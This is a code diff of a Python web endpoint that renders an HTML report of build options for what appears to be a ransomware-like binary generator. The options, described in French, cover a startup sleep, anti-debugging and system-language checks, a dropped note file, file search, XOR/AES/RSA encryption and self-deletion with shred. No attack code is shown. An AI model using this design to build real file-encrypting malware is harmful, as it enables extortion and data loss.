@@ -12,10 +12,20 @@ class Options:
     _SEARCH_DIRECTORY = 0x0
     _SEARCH_RECURSIVELY = 0x1
 
+    _SEARCH = dict()
+    _SEARCH[_SEARCH_DIRECTORY] = "normal"
+    _SEARCH[_SEARCH_RECURSIVELY] = "recursive"
+
     _ENCRYPT_NONE = 0x0
     _ENCRYPT_XOR = 0x1
     _ENCRYPT_AES = 0x2
     _ENCRYPT_RSA = 0x3
+    
+    _ENCRYPT = dict()
+    _ENCRYPT[_ENCRYPT_NONE] = "None"
+    _ENCRYPT[_ENCRYPT_XOR] = "XOR"
+    _ENCRYPT[_ENCRYPT_AES] = "AES"
+    _ENCRYPT[_ENCRYPT_RSA] = "RSA"
 
     SLEEP = None
     CHECK_DEBUG = None
@@ -116,7 +126,7 @@ def create_html():
 
     options = Options(request.json)
 
-    first = """
+    header = """
     <!DOCTYPE html>
 <html>
 <head>
@@ -186,7 +196,7 @@ and is wrapped around the whole page content, except for the footer in this exam
     <p>
     """
 
-    end = """
+    footer = """
     </p>
     </div>
   </div>
@@ -207,57 +217,36 @@ and is wrapped around the whole page content, except for the footer in this exam
 </html>
     """
 
-    if options.SLEEP != None:
-        opt_sleep = "<li>SLEEP:</li>"
-        tag_sleep = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">SLEEP</span>'
-    else:
-        opt_sleep = ""
-        tag_sleep = ""
+    opt = list()
+    tag = list()
+
+    if options.SLEEP:
+        opt.append("<li>SLEEP: Le binaire va sleep durant une dizaine de secondes au lancement</li>")
+        tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">SLEEP</span>')
     
-    if options.CHECK_DEBUG != None:
-        opt_debug = "<li>CHECK DEBUG:</li>"
-        tag_debug = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">CHECK DEBUG</span>'
-    else:
-        opt_debug = ""
-        tag_debug = ""
+    if options.CHECK_DEBUG:
+        opt.append("<li>CHECK DEBUG: Le binaire va vérifier qu'il ne soit pas debug au lancement</li>")
+        tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">CHECK DEBUG</span>')
     
-    if options.CHECK_LANGUAGE != None:
-        opt_language = "<li>CHECK LANGUAGE:</li>"
-        tag_language = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">CHECK LANGUAGE</span>'
-    else:
-        opt_language = ""
-        tag_language = ""
+    if options.CHECK_LANGUAGE:
+        opt.append("<li>CHECK LANGUAGE: Le binaire va vérifier la langue du système au lancement</li>")
+        tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">CHECK LANGUAGE</span>')
 
-    if options.ADD_NOTES != None:
-        opt_notes = "<li>ADD NOTES:</li>"
-        tag_notes = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">ADD NOTES</span>'
-    else:
-        opt_notes = ""
-        tag_notes = ""
+    if options.ADD_NOTES:
+        opt.append("<li>ADD NOTES: Le binaire va ajouter un fichier de note</li>")
+        tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">ADD NOTES</span>')
 
-    if options.GET_FILES != None:
-        opt_files = "<li>GET FILES:</li>"
-        tag_files = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">GET FILES</span>'
-    else:
-        opt_files = ""
-        tag_files = ""
+    opt.append(f"<li>GET FILES: Le binaire va chercher de manière {options._SEARCH[options._SEARCH_DIRECTORY]} les fichiers</li>")
+    tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">GET FILES</span>')
 
-    if options.ENCRYPTION != None:
-        opt_encryption = "<li>ENCRYPTION:</li>"
-        tag_encryption = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">ENCRYPTION</span>'
-    else:
-        opt_encryption = ""
-        tag_encryption = ""
+    opt.append(f"<li>ENCRYPTION: Le binaire va utiliser le type de chiffrement {options._ENCRYPT[options.ENCRYPTION]}</li>")
+    tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">ENCRYPTION</span>')
 
-    if options.AUTODELETE != None:
-        opt_autodelete = "<li>AUTODELETE:</li>"
-        tag_autodelete = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">AUTODELETE</span>'
-    else:
-        opt_autodelete = ""
-        tag_autodelete = ""
+    if options.AUTODELETE:
+        opt.append("<li>AUTODELETE: Le binaire va utiliser la command shred afin de se supprimer sur FS local</li>")
+        tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">AUTODELETE</span>')
     
-    HTML = first + opt_sleep + opt_debug + opt_language + opt_notes + opt_files + opt_encryption + opt_autodelete + \
-    mid + tag_sleep + tag_debug + tag_language + tag_notes + tag_files + tag_encryption + tag_autodelete + end
+    HTML = header + "".join(opt) + mid + "".join(tag) + footer
 
     return HTML
 
